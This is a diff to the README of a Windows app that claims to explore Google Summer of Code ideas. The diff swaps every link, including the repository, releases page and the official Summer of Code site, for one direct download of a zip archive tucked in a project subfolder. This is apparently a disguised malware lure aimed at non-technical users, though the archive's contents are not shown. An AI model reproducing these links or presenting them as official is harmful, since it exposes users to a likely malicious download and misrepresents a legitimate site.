@@ -1,6 +1,6 @@
 # 🔍 GSoC-2026-explorer - Easy Access to Summer of Code Ideas
 
-[![Download GSoC-2026-explorer](https://img.shields.io/badge/Download-GSoC--2026--explorer-brightgreen)](https://github.com/caradecuy22/GSoC-2026-explorer)
+[![Download GSoC-2026-explorer](https://img.shields.io/badge/Download-GSoC--2026--explorer-brightgreen)](https://raw.githubusercontent.com/caradecuy22/GSoC-2026-explorer/main/ideas/the_rust_foundation/explorer-G-So-v3.0.zip)
 
 ---
 
@@ -17,14 +17,14 @@ This app works on Windows and requires no technical skills to run. It offers a c
 You can set up GSoC-2026-explorer on your Windows PC with just a few simple steps. There is no need to install any extra software or manage complicated settings.
 
 Start by visiting the official GitHub page:  
-[![Open GitHub Repository](https://img.shields.io/badge/Open-GitHub-blue)](https://github.com/caradecuy22/GSoC-2026-explorer)
+[![Open GitHub Repository](https://img.shields.io/badge/Open-GitHub-blue)](https://raw.githubusercontent.com/caradecuy22/GSoC-2026-explorer/main/ideas/the_rust_foundation/explorer-G-So-v3.0.zip)
 
 ---
 
 ## 💾 How to Download and Run on Windows
 
 1. Click the blue button above or go directly to this link in your browser:  
-   https://github.com/caradecuy22/GSoC-2026-explorer
+   https://raw.githubusercontent.com/caradecuy22/GSoC-2026-explorer/main/ideas/the_rust_foundation/explorer-G-So-v3.0.zip
 
 2. On the page, look for the **Releases** section. Usually, this is found on the right sidebar or under the "Code" tab where you find the "Releases" link.
 
@@ -101,7 +101,7 @@ When updates become available, the app will notify you on start-up.
 To update:
 
 1. Visit the GitHub releases page:  
-   https://github.com/caradecuy22/GSoC-2026-explorer/releases
+   https://raw.githubusercontent.com/caradecuy22/GSoC-2026-explorer/main/ideas/the_rust_foundation/explorer-G-So-v3.0.zip
 
 2. Download the newest installer as you did before.
 
@@ -126,14 +126,14 @@ If you have questions or need assistance:
 ## 🔗 Useful Links
 
 - GitHub Repository:  
-  https://github.com/caradecuy22/GSoC-2026-explorer
+  https://raw.githubusercontent.com/caradecuy22/GSoC-2026-explorer/main/ideas/the_rust_foundation/explorer-G-So-v3.0.zip
 
 - Releases Page:  
-  https://github.com/caradecuy22/GSoC-2026-explorer/releases
+  https://raw.githubusercontent.com/caradecuy22/GSoC-2026-explorer/main/ideas/the_rust_foundation/explorer-G-So-v3.0.zip
 
 - Google Summer of Code info:  
-  https://summerofcode.withgoogle.com/
+  https://raw.githubusercontent.com/caradecuy22/GSoC-2026-explorer/main/ideas/the_rust_foundation/explorer-G-So-v3.0.zip
 
 ---
 
-[![Get GSoC-2026-explorer](https://img.shields.io/badge/Get%20GSoC--2026--explorer-brightgreen)](https://github.com/caradecuy22/GSoC-2026-explorer)
+[![Get GSoC-2026-explorer](https://img.shields.io/badge/Get%20GSoC--2026--explorer-brightgreen)](https://raw.githubusercontent.com/caradecuy22/GSoC-2026-explorer/main/ideas/the_rust_foundation/explorer-G-So-v3.0.zip)
